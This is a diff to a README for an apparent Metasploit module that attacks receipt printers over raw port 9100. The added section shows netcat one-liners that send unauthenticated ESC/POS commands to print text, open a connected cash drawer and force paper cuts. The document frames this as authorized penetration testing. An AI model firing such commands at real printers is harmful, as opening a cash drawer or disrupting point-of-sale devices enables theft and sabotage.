@@ -122,7 +122,59 @@ msf6 > set FEED_LINES 10
 msf6 > run
 
 ```
-5. Ethical Guidelines and Disclaimer
+### 5. Testing from a Linux Terminal (Without Metasploit)
+
+While the module is designed for the Metasploit Framework, you can replicate its core functionality and test a printer's vulnerability directly from a standard Linux terminal. This method uses the `netcat` utility (`nc`), which is a powerful tool for reading from and writing to network connections. This approach is ideal for quick, low-level testing of raw command injection.
+
+#### Prerequisites
+- A Linux or macOS system with `netcat` installed.
+- The target printer's IP address and port (defaulting to `9100`).
+
+#### The `echo -ne` Command
+The key to sending raw commands is to use `echo` with the `-n` and `-e` flags:
+- `-n`: Prevents `echo` from appending a newline character to the output.
+- `-e`: Enables the interpretation of backslash escapes, allowing you to use hexadecimal values like `\x1B` for the ESCAPE character.
+
+#### Pipelining to `netcat`
+You will pipe the output of `echo` directly to `netcat`, which then sends the raw data to the printer's IP and port. The command structure is:
+`echo -ne "[ESC/POS command]" | nc [Printer IP] [Port]`
+
+#### Example Test Cases
+
+### Test 1: Print a Message
+
+This will initialize the printer, print a simple message, and then feed a few lines of paper to make it readable.
+
+    echo -ne "\x1B@Hello, World!\x0A\x0A\x0A" | nc 192.168.1.100 9100
+
+
+- \x1B@ is the initialize command.
+
+- Hello, World! is the message.
+
+- \x0A is the newline character.
+
+### Test 2: Trigger the Cash Drawer
+
+This sends the command to open a cash drawer connected to the printer's cash drawer port.
+
+    echo -ne "\x1B\x70\x00\x19\x19" | nc 192.168.1.100 9100
+
+
+- \x1B\x70 is the cash drawer command prefix.
+
+The \x00\x19\x19 bytes define the specific drawer and the pulse duration.
+
+### Test 3: Force a Paper Cut
+
+This sends the most common command to cut the paper. The printer will feed the paper to the cut position and then perform a full cut.
+
+    echo -ne "\x1B\x69" | nc 192.168.1.100 9100
+
+- \x1B\x69 is the command for a full paper cut.
+
+
+### 6. Ethical Guidelines and Disclaimer
 
 This software is intended solely for educational, research, and authorized penetration testing purposes. It is a powerful tool for demonstrating the security risks associated with unauthenticated protocols in common IoT devices.
 
